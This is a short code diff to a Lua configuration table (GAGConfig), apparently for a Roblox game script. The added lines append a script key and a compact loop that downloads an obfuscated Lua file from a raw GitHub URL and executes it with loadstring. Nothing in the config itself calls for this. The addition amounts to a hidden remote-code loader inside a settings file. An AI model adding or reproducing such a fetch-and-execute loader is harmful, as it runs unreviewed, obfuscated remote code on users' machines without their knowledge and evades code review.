@@ -141,3 +141,7 @@ _G.GAGConfig = _G.GAGConfig or {
         ["Console"] = true,
     },
 }
+
+script_key="C121D2A194E1CA3545F329204D129455";
+
+local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/gag-obfuscated.lua")end)wait(1)until s;loadstring(r)()
